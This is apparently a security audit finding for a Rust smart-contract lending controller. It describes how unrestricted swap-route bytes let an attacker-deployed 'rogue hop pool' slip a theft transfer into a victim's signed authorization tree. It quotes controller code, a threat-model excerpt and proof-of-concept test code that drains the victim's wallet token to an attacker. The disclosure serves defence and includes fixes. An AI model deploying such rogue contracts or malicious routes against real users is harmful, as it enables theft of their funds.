### Title
Unrestricted swap-route contracts can execute attacker-chosen token transfers under the caller’s authorization - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Controller strategy functions accept opaque `swap` bytes and forward them to the configured router without restricting which contracts the route may invoke. A malicious route can therefore place a rogue contract beneath a caller-signed `swap_collateral`, `swap_debt`, `multiply`, or `repay_debt_with_collateral` authorization tree and make it transfer unrelated wallet tokens to an attacker.

### Finding Description
`process_swap_collateral` authenticates `caller`, accepts attacker-influenced `swap` bytes, and passes them into the swap path through `withdraw_and_swap_from_supply`. [1](#0-0)  The swap path authorizes only the controller’s exact input-token transfer to the router, but forwards the opaque `swap` payload to `router.execute_strategy`. [2](#0-1)  That one-contract authorization does not constrain contracts invoked deeper by route-selected pool or token addresses, and the documented router behavior places no allowlist on those addresses. [3](#0-2)  A route-named rogue contract can call `token.transfer(victim, attacker, amount)`; simulation records that transfer as a child of the victim’s controller authorization, and submission succeeds if the victim signs the simulated tree. [4](#0-3) 

The reachable entrypoint is, for example:

```text
swap_collateral(
  caller = victim,
  account_id = victim_account,
  current = victim_collateral_market,
  from_amount = positive_collateral_amount,
  new = destination_market,
  swap = malicious_route_bytes
)
```

The malicious `swap` names an attacker-deployed hop pool configured with `(victim, unrelated_wallet_token, attacker, amount)`; its `swap` function invokes `token::Client::transfer(victim, attacker, amount)`. [5](#0-4) 

### Impact Explanation
This permits theft of arbitrary token balances held by the signing victim, including assets completely unrelated to the lending markets being swapped. The test shows the victim’s entire `77_770_000_000` wallet-token balance moved to the attacker while the protocol swap still produced the expected collateral receipt. [6](#0-5)  Neither positive measured router output nor the final account-risk check bounds this loss because the stolen transfer is outside the routed input and output balances. [7](#0-6) 

### Likelihood Explanation
Exploitation requires the victim to sign the authorization tree containing the malicious child transfer. This is plausible when route bytes or prepared transactions are supplied by a quote service, application, or phishing flow and the wallet does not clearly display every nested authorization. Simulation makes the rogue transfer visible, but does not prevent it; signing the returned tree authorizes it. [8](#0-7)  Any unprivileged attacker can deploy the rogue hop contract and construct the route; no protocol privilege, leaked key, oracle manipulation, or contract upgrade is needed.

### Recommendation
Constrain route execution so payload-selected contracts cannot introduce unrelated calls beneath the caller’s authorization. The configured router should validate hop pool and token addresses against a registry of known venue contracts, or route execution should use an authorization model that cannot attach arbitrary `caller` token transfers as children. Until the router boundary provides that guarantee, clients must treat signed nested authorization trees as security-critical and reject any tree containing calls beyond the expected input transfer.

### Proof of Concept
The repository contains an executable model in `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:

1. Alice owns a lending account and holds an unrelated `wallet_token`; the attacker controls `attacker`.
2. `RogueHopPool` stores `(victim, wallet_token, attacker, WALLET_BALANCE)` and its `swap` entrypoint calls `transfer(victim, attacker, WALLET_BALANCE)`.
3. A route names that contract as the hop pool while producing a fair output for Alice’s collateral swap.
4. Simulation of `swap_collateral` records the rogue token transfer as a child of Alice’s controller authorization. [9](#0-8) 
5. Signing the recorded tree makes the transaction succeed: Alice’s wallet-token balance becomes zero and the attacker receives `WALLET_BALANCE`, while Alice receives the expected `ETH` collateral output. [10](#0-9)

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-160)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L56-70)
```rust
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L206-226)
```rust
    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
